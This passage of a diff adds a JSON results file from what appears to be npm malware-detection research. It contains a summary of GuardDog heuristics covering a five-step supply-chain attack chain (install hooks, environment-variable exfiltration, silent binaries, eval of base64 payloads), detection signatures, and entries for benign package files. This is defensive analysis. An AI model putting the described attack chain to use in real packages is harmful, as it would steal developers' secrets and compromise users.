+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "index.js or any JavaScript file in the package",
+                  "required_permissions": [
+                    "code_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "",
+                  "package_manager": "",
+                  "package_versions": "",
+                  "why_malicious": "This report does not analyze a specific malicious package, but instead details GuardDog's detection heuristics for identifying malicious behaviors in npm and PyPI packages. The heuristics focus on behaviors such as exfiltration of environment variables, silent execution of binaries, dynamic code execution, and unauthorized install scripts, all of which are commonly observed in malicious packages."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed or imported, triggering install-time or runtime hooks.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Execution of arbitrary code on the victim's machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes, exfiltrating environment variables or secrets.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is sent to attacker-controlled infrastructure"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code executes bundled or downloaded binaries.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Further compromise or persistence on the victim's system"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious code dynamically executes obfuscated payloads.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of additional malicious actions, evasion of static analysis"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Malicious code or files are published to PyPI but not present in the public source repository.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Supply chain compromise and undetected distribution of malware"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Serialization and exfiltration of process.env or environment variables to external domains",
+                    "Silent execution of bundled or downloaded binaries using child_process.exec or similar APIs",
+                    "Dynamic code execution via eval and base64 decoding of payloads",
+                    "Presence of install-time scripts (preinstall/postinstall) in package.json that execute undocumented or non-standard scripts",
+                    "Discrepancies between published package contents and public source repository, especially unexplained code or files"
+                  ],
+                  "file_indicators": [
+                    "package.json with suspicious or undocumented postinstall scripts",
+                    "JavaScript files containing Buffer.from(..., 'base64') followed by eval",
+                    "Presence of unexpected binaries or executable scripts in package files",
+                    "Files in PyPI package not present in GitHub repository or with differing content"
+                  ],
+                  "network_indicators": [
+                    "HTTP/HTTPS POST requests to unknown or suspicious domains hardcoded in package code",
+                    "Outbound connections to domains such as webhook.site, pastebin, or attacker-controlled endpoints during install or runtime"
+                  ],
+                  "how_to_detect": "Scan package source code and metadata for serialization and exfiltration of environment variables, use of child_process.exec or similar APIs for silent process execution, and dynamic code execution patterns such as eval with decoded content. Analyze package.json for install-time scripts (preinstall/postinstall) that execute undocumented or non-standard scripts. Compare published package contents with the public source repository to detect unauthorized modifications or unexplained files. Monitor network activity for suspicious outbound requests to hardcoded or non-standard domains during installation or runtime."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dmr/0.2.10/package/lib/app/model-provider/dim-chaineds.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dmr/0.2.10/package/lib/app/model/model.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dmr/0.2.10/package/lib/app/model/query-conditions.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dmr/0.2.10/package/lib/app/model/report.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dmr/0.2.10/package/lib/app/model/response-json.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dmr/0.2.10/package/lib/app/model/table.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
